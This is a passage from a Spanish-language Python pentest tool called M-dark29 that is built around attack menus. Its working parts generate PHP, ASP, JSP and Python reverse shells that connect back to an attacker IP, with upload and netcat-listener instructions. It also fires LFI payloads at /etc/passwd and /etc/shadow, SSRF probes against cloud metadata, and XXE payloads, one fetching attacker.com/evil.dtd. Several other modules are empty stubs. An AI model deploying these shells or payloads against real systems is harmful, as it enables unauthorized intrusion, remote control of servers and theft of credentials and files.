        ("Nmap scripts", "Detección y explotación con NSE"),
        ("Exploit-DB", "Base de datos de exploits públicos"),
    ]
    
    for herramienta, desc in herramientas:
        print(f"  {Colors.YELLOW}•{Colors.END} {herramienta}: {desc}")
    
    print(f"\n{Colors.YELLOW}[+] Ejemplo Metasploit:{Colors.END}")
    print(f"  msfconsole")
    print(f"  use exploit/multi/http/apache_mod_cgi_bash_env_exec")
    print(f"  set RHOSTS {urlparse(objetivo).netloc}")
    print(f"  set TARGETURI /cgi-bin/test.cgi")
    print(f"  exploit")

# ============================
# FUNCIONES RESTANTES (placeholders simples)
# ============================

def waf_hpp_bypass(objetivo):
    """HTTP Parameter Pollution bypass"""
    print(f"\n{Colors.YELLOW}[*] HPP bypass - En desarrollo{Colors.END}")

def waf_wildcard_bypass(objetivo):
    """Wildcard bypass"""
    print(f"\n{Colors.YELLOW}[*] Wildcard bypass - En desarrollo{Colors.END}")

def waf_unicode_bypass(objetivo):
    """Unicode bypass"""
    print(f"\n{Colors.YELLOW}[*] Unicode bypass - En desarrollo{Colors.END}")

def python_code_injection(objetivo):
    """Python code injection"""
    print(f"\n{Colors.YELLOW}[*] Python code injection - En desarrollo{Colors.END}")

def javascript_injection(objetivo):
    """JavaScript injection"""
    print(f"\n{Colors.YELLOW}[*] JavaScript injection - En desarrollo{Colors.END}")

def template_injection(objetivo):
    """Template injection"""
    print(f"\n{Colors.YELLOW}[*] Template injection - En desarrollo{Colors.END}")

def nosql_injection_attack(objetivo):
    """NoSQL injection attack"""
    print(f"\n{Colors.YELLOW}[*] NoSQL injection attack - En desarrollo{Colors.END}")

def ldap_injection(objetivo):
    """LDAP injection"""
    print(f"\n{Colors.YELLOW}[*] LDAP injection - En desarrollo{Colors.END}")

def xpath_injection(objetivo):
    """XPATH injection"""
    print(f"\n{Colors.YELLOW}[*] XPATH injection - En desarrollo{Colors.END}")

def database_dumping(objetivo):
    """Database dumping"""
    print(f"\n{Colors.YELLOW}[*] Database dumping - En desarrollo{Colors.END}")

def windows_priv_esc(objetivo):
    """Windows privilege escalation"""
    print(f"\n{Colors.YELLOW}[*] Windows privilege escalation - En desarrollo{Colors.END}")

def webapp_priv_esc(objetivo):
    """Web application privilege escalation"""
    print(f"\n{Colors.YELLOW}[*] Web app privilege escalation - En desarrollo{Colors.END}")

def database_priv_esc(objetivo):
    """Database privilege escalation"""
    print(f"\n{Colors.YELLOW}[*] Database privilege escalation - En desarrollo{Colors.END}")

def post_credential_harvesting(objetivo):
    """Credential harvesting"""
    print(f"\n{Colors.YELLOW}[*] Credential harvesting - En desarrollo{Colors.END}")

def post_network_recon(objetivo):
    """Network reconnaissance"""
    print(f"\n{Colors.YELLOW}[*] Network reconnaissance - En desarrollo{Colors.END}")

def post_data_exfiltration(objetivo):
    """Data exfiltration"""
    print(f"\n{Colors.YELLOW}[*] Data exfiltration - En desarrollo{Colors.END}")

def post_persistence(objetivo):
    """Persistence mechanisms"""
    print(f"\n{Colors.YELLOW}[*] Persistence mechanisms - En desarrollo{Colors.END}")

def exploit_eternalblue(objetivo):
    """EternalBlue exploit"""
    print(f"\n{Colors.YELLOW}[*] EternalBlue - En desarrollo{Colors.END}")

def exploit_log4shell(objetivo):
    """Log4Shell exploit"""
    print(f"\n{Colors.YELLOW}[*] Log4Shell - En desarrollo{Colors.END}")

def exploit_spring4shell(objetivo):
    """Spring4Shell exploit"""
    print(f"\n{Colors.YELLOW}[*] Spring4Shell - En desarrollo{Colors.END}")





# ============================
# MÓDULO 8: EXPLOTACIÓN AVANZADA
# ============================

def menu_explotacion_avanzada(objetivo):
    """Menú de explotación avanzada"""
    if not disclaimer_intrusivo():
        return
    
    while True:
        print(f"\n{Colors.PURPLE}{Colors.BOLD}╔════════════ EXPLOTACIÓN AVANZADA ════════════╗{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}1.{Colors.END} Reverse Shell Exploitation          {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}2.{Colors.END} Web Shell Deployment               {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}3.{Colors.END} Privilege Escalation Techniques    {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}4.{Colors.END} Lateral Movement                  {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}5.{Colors.END} Data Exfiltration Methods         {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}6.{Colors.END} Persistence Mechanisms            {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}7.{Colors.END} Covering Tracks                   {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}8.{Colors.END} Automated Exploitation            {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}0.{Colors.END} Volver al Menú Principal          {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}╚══════════════════════════════════════════════╝{Colors.END}")
        
        try:
            opcion = int(input(f"\n{Colors.YELLOW}[?] Selecciona opción: {Colors.END}"))
            
            if opcion == 0:
                break
            elif opcion == 1:
                reverse_shell_exploitation(objetivo)
            elif opcion == 2:
                web_shell_deployment(objetivo)
            elif opcion == 3:
                privilege_escalation_techniques(objetivo)
            elif opcion == 4:
                lateral_movement(objetivo)
            elif opcion == 5:
                data_exfiltration_methods(objetivo)
            elif opcion == 6:
                persistence_mechanisms(objetivo)
            elif opcion == 7:
                covering_tracks(objetivo)
            elif opcion == 8:
                automated_exploitation(objetivo)
            else:
                print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
                
        except ValueError:
            print(f"{Colors.RED}[!] Opción inválida{Colors.END}")

def reverse_shell_exploitation(objetivo):
    """Generación y explotación de reverse shells"""
    print(f"\n{Colors.GREEN}[*] Preparando reverse shell exploitation...{Colors.END}")
    
    print(f"{Colors.RED}[!] ¡ADVERTENCIA! Esta sección es para EDUCACIÓN{Colors.END}")
    print(f"{Colors.RED}[!] Solo usar en sistemas con AUTORIZACIÓN{Colors.END}")
    
    print(f"\n{Colors.CYAN}[+] Selecciona tipo de reverse shell:{Colors.END}")
    print(f"  1. Web-based reverse shell (PHP, ASP, JSP)")
    print(f"  2. Command-based reverse shell")
    print(f"  3. File upload reverse shell")
    print(f"  4. SQL injection to RCE")
    
    try:
        tipo = int(input(f"{Colors.YELLOW}[?] Tipo (1-4): {Colors.END}"))
        
        if tipo == 1:
            web_reverse_shell(objetivo)
        elif tipo == 2:
            command_reverse_shell(objetivo)
        elif tipo == 3:
            file_upload_reverse_shell(objetivo)
        elif tipo == 4:
            sqli_to_rce(objetivo)
        else:
            print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
            
    except ValueError:
        print(f"{Colors.RED}[!] Opción inválida{Colors.END}")

def web_reverse_shell(objetivo):
    """Generar y desplegar web shell"""
    print(f"\n{Colors.GREEN}[*] Generando web shell...{Colors.END}")
    
    # Obtener información para el reverse shell
    ip_atacante = input(f"{Colors.CYAN}[?] IP del atacante (tu máquina): {Colors.END}").strip()
    puerto = input(f"{Colors.CYAN}[?] Puerto para escuchar: {Colors.END}").strip() or "4444"
    
    # Seleccionar tipo de web shell
    print(f"\n{Colors.CYAN}[+] Selecciona lenguaje:{Colors.END}")
    print(f"  1. PHP")
    print(f"  2. ASP")
    print(f"  3. JSP")
    print(f"  4. Python")
    
    try:
        lang = int(input(f"{Colors.YELLOW}[?] Lenguaje (1-4): {Colors.END}"))
        
        if lang == 1:
            # PHP reverse shell
            shell_code = f"""<?php
// PHP Reverse Shell
$ip = '{ip_atacante}';
$port = {puerto};

if (($f = 'stream_socket_client') && is_callable($f)) {{
    $s = $f("tcp://{{$ip}}:{{$port}}");
    $s_type = 'stream';
}} elseif (($f = 'fsockopen') && is_callable($f)) {{
    $s = $f($ip, $port);
    $s_type = 'stream';
}} elseif (($f = 'socket_create') && is_callable($f)) {{
    $s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
    $res = @socket_connect($s, $ip, $port);
    if (!$res) die();
    $s_type = 'socket';
}} else {{
    die('No socket functions');
}}

if (!$s) die('no socket');

switch ($s_type) {{
    case 'stream': $len = fread($s, 4); break;
    case 'socket': $len = socket_read($s, 4); break;
}}

if (!$len) {{
    die();
}}

$a = unpack("Nlen", $len);
$len = $a['len'];

$b = '';

while (strlen($b) < $len) {{
    switch ($s_type) {{
        case 'stream': $b .= fread($s, $len-strlen($b)); break;
        case 'socket': $b .= socket_read($s, $len-strlen($b)); break;
    }}
}}

$GLOBALS['msgsock'] = $s;
$GLOBALS['msgsock_type'] = $s_type;

eval($b);
?>"""
            extension = "php"
            
        elif lang == 2:
            # ASP reverse shell
            shell_code = f"""<%
' ASP Reverse Shell
Dim ip, port, socket, command, shell, output
ip = "{ip_atacante}"
port = {puerto}

Set socket = Server.CreateObject("WScript.Shell")
Set shell = socket.Exec("cmd /c powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('" & ip & "'," & port & ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"")
output = shell.StdOut.ReadAll()
Response.Write output
%>"""
            extension = "asp"
            
        elif lang == 3:
            # JSP reverse shell
            shell_code = f"""<%@ page import="java.io.*,java.net.*,java.util.*" %>
<%
// JSP Reverse Shell
String ip = "{ip_atacante}";
int port = {puerto};

Socket socket = new Socket(ip, port);

Process p = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = socket.getInputStream();
OutputStream po = p.getOutputStream(), so = socket.getOutputStream();

while(!socket.isClosed()) {{
    while(pi.available()>0) so.write(pi.read());
    while(pe.available()>0) so.write(pe.read());
    while(si.available()>0) po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {{ p.exitValue(); break; }} catch (Exception e) {{}}
}}
p.destroy();
socket.close();
%>"""
            extension = "jsp"
            
        else:
            # Python web shell
            shell_code = f"""#!/usr/bin/env python3
import socket,subprocess,os,sys
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip_atacante}",{puerto}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])"""
            extension = "py"
        
        # Guardar shell en archivo
        filename = f"shell.{extension}"
        with open(filename, 'w') as f:
            f.write(shell_code)
        
        print(f"\n{Colors.GREEN}[+] Web shell generado: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[+] Para usar:{Colors.END}")
        print(f"  1. Sube el archivo al servidor objetivo")
        print(f"  2. Inicia netcat en tu máquina: nc -lvnp {puerto}")
        print(f"  3. Accede a la shell via: {objetivo}/uploaded/{filename}")
        
        # Mostrar comandos de netcat
        print(f"\n{Colors.YELLOW}[+] Comando Netcat:{Colors.END}")
        print(f"  nc -lvnp {puerto}")
        
        # Mostrar comandos alternativos
        print(f"\n{Colors.YELLOW}[+] Comandos alternativos:{Colors.END}")
        print(f"  ncat -lvnp {puerto}")
        print(f"  socat TCP-LISTEN:{puerto},reuseaddr,fork -")
        
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.END}")

# ============================
# FUNCIONES RESTANTES
# ============================

def lfi_completo(objetivo):
    """LFI completo con técnicas avanzadas"""
    print(f"\n{Colors.GREEN}[*] Ejecutando LFI completo...{Colors.END}")
    
    # Payloads LFI avanzados
    payloads = [
        # Basic LFI
        "../../../../etc/passwd",
        "../../../../etc/shadow",
        "../../../../etc/hosts",
        "../../../../etc/group",
        
        # Encoded
        "..%2f..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252f..%252fetc/passwd",
        "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        
        # Null byte
        "../../../../etc/passwd%00",
        "../../../../etc/passwd%00.jpg",
        
        # PHP wrappers
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/resource=index.php",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
        
        # Log poisoning
        "../../../../var/log/apache2/access.log",
        "../../../../var/log/apache/access.log",
        "../../../../var/log/nginx/access.log",
        "../../../../var/log/auth.log",
        
        # Session files
        "../../../../tmp/sess_",
        "../../../../var/lib/php/sessions/sess_",
        
        # Proc filesystem
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/fd/",
        
        # Windows
        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\..\\boot.ini",
    ]
    
    print(f"{Colors.CYAN}[+] Probando {len(payloads)} payloads LFI...{Colors.END}")
    
    vulnerables = []
    
    for payload in payloads:
        try:
            url = f"{objetivo.rstrip('/')}/?page={quote(payload)}"
            respuesta = requests.get(url, verify=False, timeout=5)
            
            contenido = respuesta.text.lower()
            
            # Indicadores de éxito
            if any(x in contenido for x in ['root:', 'daemon:', 'bin/', 'nobody:', '<?php', 'php version']):
                vulnerables.append(payload)
                print(f"  {Colors.GREEN}✓{Colors.END} {payload} - POSIBLE LFI")
            else:
                print(f"  {Colors.RED}✗{Colors.END} {payload} - {respuesta.status_code}")
                
        except Exception as e:
            print(f"  {Colors.RED}✗{Colors.END} {payload} - Error: {str(e)[:30]}")
    
    if vulnerables:
        print(f"\n{Colors.GREEN}[+] ¡LFI DETECTADO!{Colors.END}")
        print(f"\n{Colors.YELLOW}[!] Siguiente paso:{Colors.END}")
        print(f"  {Colors.CYAN}1.{Colors.END} Probar lectura de archivos sensibles")
        print(f"  {Colors.CYAN}2.{Colors.END} Intentar RCE via log poisoning")
        print(f"  {Colors.CYAN}3.{Colors.END} Probar PHP wrappers para código")
        print(f"  {Colors.CYAN}4.{Colors.END} Documentar archivos accesibles")
    else:
        print(f"\n{Colors.RED}[-] No se detectó LFI{Colors.END}")

# ============================
# FUNCIONES RESTANTES (implementaciones básicas)
# ============================

def info_disclosure_completo(objetivo):
    """Information disclosure completo"""
    print(f"\n{Colors.GREEN}[*] Buscando information disclosure...{Colors.END}")
    
    archivos = [
        "/.git/HEAD",
        "/.env",
        "/config.php",
        "/settings.py",
        "/web.config",
        "/robots.txt",
        "/sitemap.xml",
        "/phpinfo.php",
        "/test.php",
        "/admin.php",
        "/backup.zip",
        "/dump.sql",
        "/error_log",
        "/.DS_Store",
        "/.htaccess",
        "/.htpasswd",
    ]
    
    for archivo in archivos:
        try:
            url = f"{objetivo.rstrip('/')}{archivo}"
            respuesta = requests.get(url, verify=False, timeout=5)
            
            if respuesta.status_code == 200:
                print(f"  {Colors.GREEN}✓{Colors.END} {archivo} - ACCESIBLE ({len(respuesta.text)} bytes)")
                
                # Verificar contenido sensible
                contenido = respuesta.text.lower()
                if any(x in contenido for x in ['password', 'secret', 'key', 'token', 'database']):
                    print(f"     {Colors.RED}⚠ CONTENIDO SENSIBLE DETECTADO{Colors.END}")
            else:
                print(f"  {Colors.RED}✗{Colors.END} {archivo} - {respuesta.status_code}")
                
        except Exception as e:
            print(f"  {Colors.RED}✗{Colors.END} {archivo} - Error")

def ssrf_completo(objetivo):
    """SSRF completo"""
    print(f"\n{Colors.GREEN}[*] Probando SSRF...{Colors.END}")
    
    # Payloads SSRF
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:22",
        "http://127.0.0.1:3306",
        "http://[::1]:80",
        "file:///etc/passwd",
        "gopher://localhost:6379/_",
        "dict://localhost:11211/stat",
    ]
    
    for payload in payloads:
        try:
            url = f"{objetivo.rstrip('/')}/?url={quote(payload)}"
            respuesta = requests.get(url, verify=False, timeout=10)
            
            if respuesta.status_code != 400 and respuesta.status_code != 500:
                print(f"  {Colors.YELLOW}?{Colors.END} {payload} - Respuesta: {respuesta.status_code}")
                if len(respuesta.text) < 1000:
                    print(f"     Preview: {respuesta.text[:100]}...")
        except:
            print(f"  {Colors.RED}✗{Colors.END} {payload} - Error")

def xxe_attack(objetivo):
    """XXE Attack"""
    print(f"\n{Colors.GREEN}[*] Probando XXE...{Colors.END}")
    
    payloads = [
        """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>""",
        """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><root/>""",
    ]
    
    for payload in payloads:
        try:
            headers = {'Content-Type': 'application/xml'}
            respuesta = requests.post(objetivo, data=payload, headers=headers, verify=False, timeout=10)
            
            if 'root:' in respuesta.text:
                print(f"  {Colors.GREEN}✓{Colors.END} Posible XXE detectado")
                break
        except:
            pass
    
    print(f"  {Colors.RED}[-] No se detectó XXE{Colors.END}")

# ============================
# FUNCIONES AUXILIARES
# ============================

def whois_completo(objetivo):
    """WHOIS completo"""
    print(f"\n{Colors.GREEN}[*] Realizando WHOIS lookup...{Colors.END}")
    
    dominio = urlparse(objetivo).netloc
    
    try:
        # Usar sistema whois si está disponible
        resultado = subprocess.run(['whois', dominio], capture_output=True, text=True, timeout=10)
        
        if resultado.returncode == 0:
            lines = resultado.stdout.split('\n')
            
            info_importante = []
            for line in lines:
                if any(x in line.lower() for x in ['registrar', 'created', 'expires', 'name server', 'admin', 'tech']):
                    info_importante.append(line.strip())
            
            if info_importante:
                print(f"{Colors.CYAN}[+] Información WHOIS:{Colors.END}")
                for info in info_importante[:20]:  # Limitar a 20 líneas
                    print(f"  {info}")
            else:
                print(f"{Colors.YELLOW}[-] No se encontró información WHOIS relevante{Colors.END}")
        else:
            print(f"{Colors.YELLOW}[-] Comando whois no disponible{Colors.END}")
            
    except:
        print(f"{Colors.YELLOW}[-] No se pudo obtener información WHOIS{Colors.END}")

def google_dorks_automatizados(objetivo):
    """Google dorks automatizados"""
    dominio = urlparse(objetivo).netloc
    
    print(f"\n{Colors.GREEN}[*] Google Dorks para {dominio}:{Colors.END}")
    
    dorks = [
        f'site:{dominio} "index of"',
        f'site:{dominio} "password" OR "passwd" OR "pwd"',
        f'site:{dominio} "username" OR "user" OR "login"',
        f'site:{dominio} ext:sql OR ext:db OR ext:dbf OR ext:mdb',
        f'site:{dominio} ext:pdf OR ext:doc OR ext:docx OR ext:xls',
        f'site:{dominio} "api_key" OR "apikey" OR "api key"',
        f'site:{dominio} "secret" OR "key" OR "token"',
        f'site:{dominio} intitle:"index of /"',
        f'site:{dominio} "error" OR "warning" OR "exception"',
        f'site:{dominio} inurl:admin OR inurl:login OR inurl:auth',
    ]
    
    for dork in dorks:
        print(f"  {Colors.CYAN}•{Colors.END} {dork}")
    
    print(f"\n{Colors.YELLOW}[!] Copia y pega estos dorks en Google{Colors.END}")

def info_servidor_completa(objetivo):
    """Información completa del servidor"""
    try:
        respuesta = requests.get(objetivo, verify=False, timeout=10, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        headers = respuesta.headers
        
        print(f"\n{Colors.GREEN}[*] Información del servidor web:{Colors.END}")
        
        info = {
            'Server': headers.get('Server', 'No especificado'),
            'X-Powered-By': headers.get('X-Powered-By', 'No especificado'),
            'X-AspNet-Version': headers.get('X-AspNet-Version', 'No especificado'),
            'X-AspNetMvc-Version': headers.get('X-AspNetMvc-Version', 'No especificado'),
            'X-Frame-Options': headers.get('X-Frame-Options', 'No configurado'),
            'Content-Security-Policy': headers.get('Content-Security-Policy', 'No configurado'),
            'Strict-Transport-Security': headers.get('Strict-Transport-Security', 'No configurado'),
            'X-Content-Type-Options': headers.get('X-Content-Type-Options', 'No configurado'),
            'X-XSS-Protection': headers.get('X-XSS-Protection', 'No configurado'),
        }
        
        for key, value in info.items():
            print(f"  {Colors.CYAN}{key}:{Colors.END} {value}")
        
        # Análisis de seguridad
        print(f"\n{Colors.YELLOW}[!] Análisis de headers de seguridad:{Colors.END}")
        
        if info['X-Frame-Options'] == 'No configurado':
            print(f"  {Colors.RED}⚠ X-Frame-Options no configurado (Clickjacking risk){Colors.END}")
        else:
            print(f"  {Colors.GREEN}✓{Colors.END} X-Frame-Options configurado")
        
        if info['Content-Security-Policy'] == 'No configurado':
            print(f"  {Colors.YELLOW}⚠ Content-Security-Policy no configurado{Colors.END}")
        else:
            print(f"  {Colors.GREEN}✓{Colors.END} CSP configurado")
        
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.END}")

# ============================
# MAIN
# ============================

def main():
    """Función principal del programa"""
    # Mostrar banner y disclaimer
    banner()
    
    # Obtener objetivo
    objetivo = obtener_objetivo()
    print(f"\n{Colors.GREEN}[*] Objetivo establecido: {objetivo}{Colors.END}")
    
    while True:
        opcion = mostrar_menu_principal()
        
        if opcion == 0:
            print(f"\n{Colors.GREEN}[*] Saliendo de M-dark29...{Colors.END}")
            break
        
        elif opcion == 1:
            menu_reconocimiento(objetivo)
        
        elif opcion == 2:
            menu_escaneo_avanzado(objetivo)
        
        elif opcion == 3:
            menu_vulnerabilidades_completas(objetivo)
        
        elif opcion == 4:
            menu_sql_injection_completo(objetivo)
        
        elif opcion == 5:
            menu_autenticacion(objetivo)
        
        elif opcion == 6:
            menu_tecnologias(objetivo)
        
        elif opcion == 7:
            menu_ataques_intrusivos(objetivo)
        
        elif opcion == 8:
            menu_explotacion_avanzada(objetivo)
        
        elif opcion == 9:
            generar_reporte_completo(objetivo)
        
        else:
            print(f"{Colors.RED}[!] Opción inválida. Intenta de nuevo.{Colors.END}")

def obtener_objetivo():
    """Solicita y valida el objetivo"""
    print(f"\n{Colors.GREEN}[*] Ingresa el objetivo:{Colors.END}")
    objetivo = input(f"{Colors.YELLOW}[?] URL o IP: {Colors.END}").strip()
    
    if not objetivo.startswith(('http://', 'https://')):
        objetivo = f"https://{objetivo}"
    
    return objetivo

# ============================
# FUNCIONES DE MENÚS (placeholder)
# ============================

#def menu_autenticacion(objetivo):
#    """Menú de autenticación"""
#    print(f"\n{Colors.YELLOW}[*] Menú de Autenticación - En desarrollo{Colors.END}")
    # Implementar similar a otros menús

def menu_tecnologias(objetivo):
    """Menú de tecnologías"""
    print(f"\n{Colors.YELLOW}[*] Menú de Tecnologías - En desarrollo{Colors.END}")
    # Implementar similar a otros menús

def generar_reporte_completo(objetivo):
    """Genera reporte completo"""
    print(f"\n{Colors.GREEN}[*] Generando reporte completo...{Colors.END}")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"reporte_{urlparse(objetivo).netloc}_{timestamp}.txt"
    
    reporte = f"""
    REPORTE DE PENTEST - M-dark29 v2.0
    ==================================
    Fecha: {datetime.now()}
    Objetivo: {objetivo}
    
    1. RESUMEN EJECUTIVO
    --------------------
    Pruebas realizadas con M-dark29 v2.0
    Herramienta para pruebas de seguridad en entornos controlados
    
    2. HALLazGOS
    ------------
    Nota: Este es un reporte de ejemplo. 
    Los hallazgos reales deben documentarse manualmente.
    
    3. RECOMENDACIONES
    ------------------
    • Implementar WAF
    • Configurar headers de seguridad
    • Realizar auditorías regulares
    • Training de seguridad para desarrolladores
    
    4. CONCLUSIÓN
    -------------
    Es fundamental mantener un programa de seguridad continuo.
    
    """
    
    with open(filename, 'w') as f:
        f.write(reporte)
    
    print(f"{Colors.GREEN}[+] Reporte guardado como: {filename}{Colors.END}")

# ============================
# EJECUCIÓN PRINCIPAL
# ============================

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}[!] Programa interrumpido por el usuario.{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error crítico: {e}{Colors.END}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
